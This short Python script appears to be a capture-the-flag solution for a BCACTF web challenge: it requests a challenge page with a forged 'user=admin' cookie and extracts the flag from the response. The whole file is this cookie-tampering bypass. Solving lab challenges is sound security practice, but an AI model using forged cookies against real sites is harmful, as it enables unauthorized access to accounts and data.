#!/usr/bin/python3

import requests
import re

url = "http://web.bcactf.com:49155/"
cookies = {"user": "admin"}

r = requests.get(url + "off", cookies=cookies)

response = r.text

print(re.findall("bcactf{.*}", response)[0])